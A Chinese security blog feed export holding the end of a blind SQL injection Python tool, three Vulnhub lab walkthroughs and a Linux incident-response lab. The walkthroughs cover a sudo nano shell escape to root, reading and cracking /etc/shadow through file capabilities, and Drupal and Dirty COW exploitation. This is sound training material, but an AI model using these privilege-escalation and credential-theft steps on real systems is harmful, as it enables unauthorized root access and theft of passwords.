print(&#x27;\033[93m---------------------------- 库表字段查询中 ------------------------------\033[0m&#x27;)</span><br><span class="line">        threading_status = True     # 启动副线程</span><br><span class="line">        column_names = column_name(column_length(User_table_name),User_table_name)       #求字段的名字，输入字段的长度</span><br><span class="line">        threading_status = False    #关闭副线程</span><br><span class="line">        if len(column_names) == 0:</span><br><span class="line">            print(&quot;\n\033[91m[-]\033[0m 查询失败，请调整\033[91mcolumn_length函数中对数值爆破的长度值，或检查使用的payload\033[0m&quot;)</span><br><span class="line">            kill()</span><br><span class="line">        while True:             #这里做无限循环，方便查询表的所有字段值</span><br><span class="line">            print(&#x27;\n\033[93m---------------------------- 选择查询字段名 ------------------------------\033[0m&#x27;)</span><br><span class="line">            print(f&quot;\033[92m[+]\033[0m &#123;User_table_name&#125;表所有\033[96m字段名\033[0m为：\033[94m&#123;column_names&#125;\033[0m&quot;)</span><br><span class="line">            User_column_name = input(&#x27;请输入要查看的字段名（exit退出）：&#x27;)</span><br><span class="line">            if User_column_name == &#x27;exit&#x27;:</span><br><span class="line">                break</span><br><span class="line">            # （5）开始查询数据库表字段的数据值</span><br><span class="line">            print(&#x27;\033[93m---------------------------- 字段数据查询中 ------------------------------\033[0m&#x27;)</span><br><span class="line">            threading_status = True     # 启动副线程</span><br><span class="line">            column_data_len = column_data_length(User_table_name,User_column_name)   #求字段值的长度，传入字段的名称</span><br><span class="line">            column_data_names = column_data_name(column_data_len,User_table_name,User_column_name)  #求字段的值</span><br><span class="line">            threading_status = False    #关闭副线程</span><br><span class="line">            print(&#x27;\n\033[92m---------------------------- 字段数据查询结束 ------------------------------\033[0m&#x27;)</span><br><span class="line">            if len(column_data_names) == 0:</span><br><span class="line">                print(&quot;\033[91m[-]\033[0m 查询失败，请调整\033[91mcolumn_data_length函数中对数值爆破的长度值，或检查使用的payload\033[0m&quot;)</span><br><span class="line">                print(&quot;\033[91m[-]\033[0m 查询失败。如果增大查询力度仍不可用，则此处可能是一张空表，可更换其他表或字段查看&quot;)</span><br><span class="line">                kill()</span><br><span class="line">            print(f&quot;\033[92m[+]\033[0m &#123;User_column_name&#125;字段所有\033[96m数值\033[0m为：\033[94m&#123;column_data_names&#125;\033[0m&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        main()  #执行主线程</span><br><span class="line">        kill()  #执行处理函数</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h1 id="五、结语"><a href="#五、结语" class="headerlink" title="五、结语"></a>五、结语</h1><p>此为小菜的自制脚本，大佬勿喷，如有不妥之处还请联系指正学习。</p><p>此脚本仅供学习参考使用，未在授权情况下对其他计算机造成的损失均由使用人承担。</p>]]></content>
      
      
      <categories>
          
          <category> Python武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python武器库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub靶场—Noob</title>
      <link href="/2024/03/29/Vulnhub-Noob/"/>
      <url>/2024/03/29/Vulnhub-Noob/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-Noob靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-Noob靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub Noob靶场渗透"></a>【Vulnhub系列靶场】Vulnhub Noob靶场渗透</h1><h1 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h1><p><img src="/img/Vulnhub-Noob/image-20240329123501318.png" alt="image-20240329123501318"></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><p><img src="/img/Vulnhub-Noob/image-20240329123534496.png" alt="image-20240329123534496"></p><p><img src="/img/Vulnhub-Noob/image-20240329123821191.png" alt="image-20240329123821191"></p><p><img src="/img/Vulnhub-Noob/image-20240329125303259.png" alt="image-20240329125303259"></p><p>有一个<code>go.php</code>的form表单接收文件</p><p><img src="/img/Vulnhub-Noob/image-20240329151526498.png" alt="image-20240329151526498"></p><p>这里识别21端口存在未授权，55077 是ssh 的服务端口</p><h1 id="三、web渗透"><a href="#三、web渗透" class="headerlink" title="三、web渗透"></a>三、web渗透</h1><h2 id="1、web信息收集"><a href="#1、web信息收集" class="headerlink" title="1、web信息收集"></a>1、web信息收集</h2><p>首页是一个登陆界面</p><p><img src="/img/Vulnhub-Noob/image-20240329125547353.png" alt="image-20240329125547353"></p><p>扫描一下路径，看来重点是这个登陆页面</p><p><img src="/img/Vulnhub-Noob/image-20240329133333186.png" alt="image-20240329133333186"></p><p>看一下页面源代码</p><p><img src="/img/Vulnhub-Noob/image-20240329133422245.png" alt="image-20240329133422245"></p><p>这段js代码很有意思，总体来说，是防止用户使用特定的键盘快捷键和鼠标操作，如复制、撤销、右键菜单和上下文菜单。这可以用于保护网页内容，防止用户进行某些可能不希望的操作。</p><p>感觉暂时没什么用</p><p>针对登陆表单尝试sql注入，注入失败啊</p><p><img src="/img/Vulnhub-Noob/image-20240329134641028.png" alt="image-20240329134641028"></p><h2 id="2、ftp-未授权访问"><a href="#2、ftp-未授权访问" class="headerlink" title="2、ftp 未授权访问"></a>2、ftp 未授权访问</h2><p>尝试空密码登陆ftp，成功</p><p><img src="/img/Vulnhub-Noob/image-20240329134630921.png" alt="image-20240329134630921"></p><p>将两个文件下载下来</p><p><img src="/img/Vulnhub-Noob/image-20240329135118204.png" alt="image-20240329135118204"></p><p><code>cred.txt</code>文件解密，拿到一组账号密码</p><p><img src="/img/Vulnhub-Noob/image-20240329135252491.png" alt="image-20240329135252491"></p><p>在文档编辑器中打开<code>welcome</code>文件</p><p><img src="/img/Vulnhub-Noob/image-20240329135313642.png" alt="image-20240329135313642"></p><h2 id="3、web入侵"><a href="#3、web入侵" class="headerlink" title="3、web入侵"></a>3、web入侵</h2><p>用拿到的账号密码登陆web首页，成功登陆</p><p><img src="/img/Vulnhub-Noob/image-20240329135502281.png" alt="image-20240329135502281"></p><p>想查看页面源代码，发现右击失效，应该上面遇到的js 的原因，这个很好绕过，在url 连接前方添加如下即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Noob/image-20240329135740726.png" alt="image-20240329135740726"></p><p>这里，存在一个<code>.rar</code>的压缩包，</p><p><img src="/img/Vulnhub-Noob/image-20240329140536932.png" alt="image-20240329140536932"></p><p>下载解压</p><p><img src="/img/Vulnhub-Noob/image-20240329140632291.png" alt="image-20240329140632291"></p><p>提取其中的文字</p><p><img src="/img/Vulnhub-Noob/image-20240329141034651.png" alt="image-20240329141034651"></p><p>有趣的文件名？sudo，确实是一个很有趣的文件名，但是它不能给我们更多的帮助</p><p>既然能下载文件，是否存在任意文件下载？遗憾的是并不存在</p><p>将后台的照片下载下来，查看是否存在隐写</p><p><img src="/img/Vulnhub-Noob/image-20240329150952649.png" alt="image-20240329150952649"></p><p>存在Zlib 数据，使用<code>dd</code>命令进行提取</p><p><img src="/img/Vulnhub-Noob/image-20240329151025639.png" alt="image-20240329151025639"></p><p><img src="/img/Vulnhub-Noob/image-20240329151223463.png" alt="image-20240329151223463"></p><p>拿到一个密码<code>blehguessme090</code>，差个用户名</p><h2 id="4、获取shell立足点"><a href="#4、获取shell立足点" class="headerlink" title="4、获取shell立足点"></a>4、获取shell立足点</h2><p>这个用户名我尝试了多种方法，找敏感单词等，以及爆破的方式都尝试过了，均失败</p><p>那么，回过头来查看手里的线索，可疑的点停留在了web下载的<code>.rar</code>文件，该文件中存在两张一模一样的图片，一个是<code>.jpg</code>文件，一个是<code>.bmp</code>文件</p><p><img src="/img/Vulnhub-Noob/image-20240329160516399.png" alt="image-20240329160516399"></p><p>比对这两张图片</p><p><img src="/img/Vulnhub-Noob/image-20240329160623811.png" alt="image-20240329160623811"></p><p>看来还是有差异的</p><p>查看有无隐写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info funny.jpg</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Noob/image-20240329162858078.png" alt="image-20240329162858078"></p><p>两个文件都存在隐写，<code>.bmp</code>文件需要正确的密码，而<code>.jpg</code>无密码，提取出来看一下</p><p><img src="/img/Vulnhub-Noob/image-20240329163028558.png" alt="image-20240329163028558"></p><p>提示我们进行旋转，提取另一个文件，用<code>sudo</code>这个密码</p><p><img src="/img/Vulnhub-Noob/image-20240329163218941.png" alt="image-20240329163218941"></p><p>对这个内容进行Rot13解密</p><p><img src="/img/Vulnhub-Noob/image-20240329165745279.png" alt="image-20240329165745279"></p><p>给了一个<code>wtf</code>，试试ssh登陆</p><p><img src="/img/Vulnhub-Noob/image-20240329170404273.png" alt="image-20240329170404273"></p><p>成功登陆进来</p><h1 id="四、提权root"><a href="#四、提权root" class="headerlink" title="四、提权root"></a>四、提权root</h1><h2 id="1、翻找敏感文件"><a href="#1、翻找敏感文件" class="headerlink" title="1、翻找敏感文件"></a>1、翻找敏感文件</h2><p>看当前用户的历史记录</p><p><img src="/img/Vulnhub-Noob/image-20240329172307494.png" alt="image-20240329172307494"></p><p>发现几个敏感文件<img src="/img/Vulnhub-Noob/image-20240329172446376.png" alt="image-20240329172446376"></p><p>昂，这里，有添加用户的权限吗<img src="/img/Vulnhub-Noob/image-20240329172605026.png" alt="image-20240329172605026"></p><p>这里有一个flag<img src="/img/Vulnhub-Noob/image-20240329172624538.png" alt="image-20240329172624538"></p><h2 id="2、提权至n00b"><a href="#2、提权至n00b" class="headerlink" title="2、提权至n00b"></a>2、提权至n00b</h2><p>挨着看一下这些敏感文件发现n00b 的账号和密码：<code>n00b:aw3s0m3p@$$w0rd</code><img src="/img/Vulnhub-Noob/image-20240329172926878.png" alt="image-20240329172926878"></p><p>登陆一下<img src="/img/Vulnhub-Noob/image-20240329173131796.png" alt="image-20240329173131796"></p><p>登陆成功，依然，翻看一下历史命令文件<img src="/img/Vulnhub-Noob/image-20240329173323690.png" alt="image-20240329173323690"></p><p>在<code>/home/rooot</code>目录下有个flag<img src="/img/Vulnhub-Noob/image-20240329173454121.png" alt="image-20240329173454121"></p><p>只领先两步？好像是一个没啥用的提示</p><h2 id="3、提权至root"><a href="#3、提权至root" class="headerlink" title="3、提权至root"></a>3、提权至root</h2><p>发现可以免密码用root权限使用<code>nano</code>命令，这个好消息太重要了</p><p><img src="/img/Vulnhub-Noob/image-20240329174100117.png" alt="image-20240329174100117"></p><p>使用如下提权至root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nano</span><br><span class="line">^R^X</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Noob/image-20240329174250964.png" alt="image-20240329174250964"></p><p>这里还可以做反弹shell，使操作更加舒畅</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub_Connect-The-Dots</title>
      <link href="/2024/03/26/Vulnhub-Connect-The-Dots/"/>
      <url>/2024/03/26/Vulnhub-Connect-The-Dots/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-Connect-The-Dots靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-Connect-The-Dots靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub Connect-The-Dots靶场渗透"></a>【Vulnhub系列靶场】Vulnhub Connect-The-Dots靶场渗透</h1><h1 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h1><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326194456246.png" alt="image-20240326194456246"></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326194528129.png" alt="image-20240326194528129"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326195354306.png" alt="image-20240326195354306"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326195725031.png" alt="image-20240326195725031"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">21/tcp    open  ftp      vsftpd 2.0.8 or later</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Landing Page</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      36491/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      39219/udp   mountd</span><br><span class="line">|   100005  1,2,3      57615/tcp   mountd</span><br><span class="line">|   100005  1,2,3      60794/udp6  mountd</span><br><span class="line">|   100021  1,3,4      34413/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      40025/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41099/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      49864/udp   nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">2049/tcp  open  nfs      3-4 (RPC #100003)</span><br><span class="line">7822/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA)</span><br><span class="line">|   256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA)</span><br><span class="line">|_  256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519)</span><br><span class="line">34413/tcp open  nlockmgr 1-4 (RPC #100021)</span><br><span class="line">38351/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">57615/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">58867/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="line">MAC Address: 00:0C:29:E9:55:60 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>ssh 服务开放在7822端口</p><h1 id="三、web渗透"><a href="#三、web渗透" class="headerlink" title="三、web渗透"></a>三、web渗透</h1><h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326195236335.png" alt="image-20240326195236335"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326201055942.png" alt="image-20240326201055942"></p><p>在nmap 进行漏洞探测的时候发现存在要给mysite 文件夹</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326205256561.png" alt="image-20240326205256561"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326201303086.png" alt="image-20240326201303086"></p><p>一个被加密过的js</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326203944010.png" alt="image-20240326203944010"></p><p>一个静态的登陆页</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326201410832.png" alt="image-20240326201410832"></p><p>看源代码发现加载了加密过的js</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326204116393.png" alt="image-20240326204116393"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326204212584.png" alt="image-20240326204212584"></p><h2 id="2、获取shell"><a href="#2、获取shell" class="headerlink" title="2、获取shell"></a>2、获取shell</h2><p>我们把所有b1加密后的字符串加起来输出</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326205037216.png" alt="image-20240326205037216"></p><p>之后进行js Fuck 的解密</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326205007264.png" alt="image-20240326205007264"></p><p>拿到一个<code>TryToGuessThisNorris@2k19</code>的密码</p><p>尝试ssh 登陆</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326205848716.png" alt="image-20240326205848716"></p><h1 id="四、提权morris"><a href="#四、提权morris" class="headerlink" title="四、提权morris"></a>四、提权morris</h1><h2 id="1、信息收集-1"><a href="#1、信息收集-1" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210042414.png" alt="image-20240326210042414"></p><p><code>game.jpg.bak</code>文件存在摩斯密码</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210407277.png" alt="image-20240326210407277"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210554979.png" alt="image-20240326210554979"></p><p>用摩斯密码解密网站，说有一个<code>SECRETFILE</code>的文件</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210801616.png" alt="image-20240326210801616"></p><p>在<code>/var/www/html</code>目录下找到</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326210939211.png" alt="image-20240326210939211"></p><p>通过浏览器下载<code>.swp</code>文件</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326211750493.png" alt="image-20240326211750493"></p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326212139549.png" alt="image-20240326212139549"></p><h1 id="五、提权至root"><a href="#五、提权至root" class="headerlink" title="五、提权至root"></a>五、提权至root</h1><p>遍历程序文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213044117.png" alt="image-20240326213044117"></p><p>打包<code>/etc</code>目录文件</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213113205.png" alt="image-20240326213113205"></p><p>再解包查看<code>shadow</code>文件</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213133469.png" alt="image-20240326213133469"></p><p>破解root 的密码即可</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213152518.png" alt="image-20240326213152518"></p><p>打包&#x2F;root 目录查看flag</p><p><img src="/img/Vulnhub-Connect-The-Dots/image-20240326213539110.png" alt="image-20240326213539110"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub靶场_Lampiao-1</title>
      <link href="/2024/03/25/Vulnhub-Lampiao-1/"/>
      <url>/2024/03/25/Vulnhub-Lampiao-1/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-Lampiao-1靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-Lampiao-1靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub Lampiao-1靶场渗透"></a>【Vulnhub系列靶场】Vulnhub Lampiao-1靶场渗透</h1><h1 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h1><p><img src="/img/Vulnhub-Lampiao-1/image-20240325191522357.png" alt="image-20240325191522357"></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><p><img src="/img/Vulnhub-Lampiao-1/image-20240325191550738.png" alt="image-20240325191550738"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325193813636.png" alt="image-20240325193813636"></p><h1 id="三、web框架"><a href="#三、web框架" class="headerlink" title="三、web框架"></a>三、web框架</h1><p><img src="/img/Vulnhub-Lampiao-1/image-20240325193939435.png" alt="image-20240325193939435"></p><h1 id="四、web渗透"><a href="#四、web渗透" class="headerlink" title="四、web渗透"></a>四、web渗透</h1><h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p><img src="/img/Vulnhub-Lampiao-1/image-20240325194110526.png" alt="image-20240325194110526"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325194340461.png" alt="image-20240325194340461"></p><h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200211393.png" alt="image-20240325200211393"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325195457228.png" alt="image-20240325195457228"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325195511227.png" alt="image-20240325195511227"></p><p>获得版本信息<code>7.56</code></p><h2 id="3、获取shell"><a href="#3、获取shell" class="headerlink" title="3、获取shell"></a>3、获取shell</h2><p>查找版本信息漏洞</p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200621885.png" alt="image-20240325200621885"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200645655.png" alt="image-20240325200645655"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200702213.png" alt="image-20240325200702213"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325200709998.png" alt="image-20240325200709998"></p><h1 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h1><h2 id="1、提权至普通用户"><a href="#1、提权至普通用户" class="headerlink" title="1、提权至普通用户"></a>1、提权至普通用户</h2><p>找drupal 数据库的配置文件：</p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212457865.png" alt="image-20240325212457865"></p><p>提权到普通用户<code>tiago</code></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212719463.png" alt="image-20240325212719463"></p><h2 id="2、提权到root"><a href="#2、提权到root" class="headerlink" title="2、提权到root"></a>2、提权到root</h2><p>脏牛提权：</p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212112731.png" alt="image-20240325212112731"></p><p>上传到靶机获取root 密码</p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212023647.png" alt="image-20240325212023647"></p><p><img src="/img/Vulnhub-Lampiao-1/image-20240325212216152.png" alt="image-20240325212216152"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急靶场】知攻善防Linux Web2靶场入侵排查</title>
      <link href="/2024/03/23/Emergency-Linux-web2/"/>
      <url>/2024/03/23/Emergency-Linux-web2/</url>
      
        <content type="html"><![CDATA[<h1 id="知攻善防Linux-Web2靶场入侵排查"><a href="#知攻善防Linux-Web2靶场入侵排查" class="headerlink" title="知攻善防Linux Web2靶场入侵排查"></a>知攻善防Linux Web2靶场入侵排查</h1><p><strong>前景需要：</strong>看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！</p><p>1,提交攻击者IP</p><p>2,提交攻击者修改的管理员密码(明文)</p><p>3,提交第一次Webshell的连接URL(<a href="http://xxx.xxx.xxx.xx/abcdefg?abcdefg%E5%8F%AA%E9%9C%80%E8%A6%81%E6%8F%90%E4%BA%A4abcdefg?abcdefg">http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg</a>)</p><p>3,提交Webshell连接密码</p><p>4,提交数据包的flag1</p><p>5,提交攻击者使用的后续上传的木马文件名称</p><p>6,提交攻击者隐藏的flag2</p><p>7,提交攻击者隐藏的flag3</p><h1 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h1><p>靶场来自<code>知攻善防实验室</code>公众号：回复<code>靶机Linux2</code></p><p><img src="/img/Emergency-Linux-web2/image-20240322131714449.png" alt="image-20240322131714449"></p><p>打开即可，靶机的启动界面如下，使用了多种方法无法进入桌面，根据该靶机的文件大小推测，该靶机没有安装图形界面</p><p><img src="/img/Emergency-Linux-web2/image-20240322131908432.png" alt="image-20240322131908432"></p><h1 id="二、账户安全"><a href="#二、账户安全" class="headerlink" title="二、账户安全"></a>二、账户安全</h1><p>检查<code>/etc/passwd</code>和<code>/etc/shadow</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep -v nologin        #查看可以登陆的用户</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow    #查看可以远程登陆的用户</span><br></pre></td></tr></table></figure><img src="/img/Emergency-Linux-web2/image-20240322132303444.png" alt="image-20240322132303444" style="zoom:150%;" /><p>并无其他用户，查看下<code>/home</code>目录</p><p><img src="/img/Emergency-Linux-web2/image-20240322132512661.png" alt="image-20240322132512661"></p><p>有一个<code>www</code>用户，这莫不是web用户？存在于&#x2F;home目录下，属于是普通用户吗？查看www用户的shell环境</p><p><img src="/img/Emergency-Linux-web2/image-20240322132715892.png" alt="image-20240322132715892"></p><p>该www确实是属于普通用户，但是shell环境属于<code>/sbin/nologin</code>，不能进行正常登陆</p><p>通过<code>who</code>命令查看下当前该机器登陆的用户有哪些（tty本地登陆 pts远程登录）</p><p><img src="/img/Emergency-Linux-web2/image-20240322165437895.png" alt="image-20240322165437895"></p><p>只有本地登录的roor 用户</p><p>通过<code>last</code>命令排查最后登陆的时间，发现<code>192.168.20.1</code>这个可疑IP进行过多次远程登陆</p><p><img src="/img/Emergency-Linux-web2/image-20240322212519592.png" alt="image-20240322212519592"></p><h1 id="三、历史命令排查"><a href="#三、历史命令排查" class="headerlink" title="三、历史命令排查"></a>三、历史命令排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history          #查看root历史命令</span><br></pre></td></tr></table></figure><p>但是这里有点坑，看不到上面的历史记录，是滑动不了的</p><p><img src="/img/Emergency-Linux-web2/image-20240322133029147.png" alt="image-20240322133029147"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | more       #通过more进行一页页命令的翻看</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Linux-web2/image-20240322133330907.png" alt="image-20240322133330907"></p><p>这里是关闭了防火墙，然后安装了宝塔，去www目录下看了看日志</p><p><img src="/img/Emergency-Linux-web2/image-20240322133631229.png" alt="image-20240322133631229"></p><p>这里是在<code>wwwroot/127.0.0.1</code>下面删除了flag1 跟 1，然后删除了<code>pe9.sql</code>文件，这个应该是数据库的一个sql文件，还执行过<code>docker ps</code>命令，这台机器还运行着docker ？</p><p><img src="/img/Emergency-Linux-web2/image-20240322134129029.png" alt="image-20240322134129029"></p><p>这里对网站根路径下的<code>.api</code>文件夹做了一些粘贴，之后从100行开始，逐渐不对劲起来</p><p>在尝试增加一个<code>flag3&#123;5LourqoFt5d2zy0VUoVPJb0meVmoKgcy60Z&#125;</code>的用户，但是在<code>useradd: invalid user name &#39;flag3&#123;5LourqoFt5d2zy0VUoVPJb0meVmoKgcy60Z&#125;&#39;</code>的错误信息来看，应该是没有添加上。之后还对<code>/etc/profile</code>文件进行了编辑，应该是做了某些配置变量的修改，之后<code>source /etc/profile</code>重新加载配置变量</p><p><img src="/img/Emergency-Linux-web2/image-20240322135823186.png" alt="image-20240322135823186"></p><p>这里，root 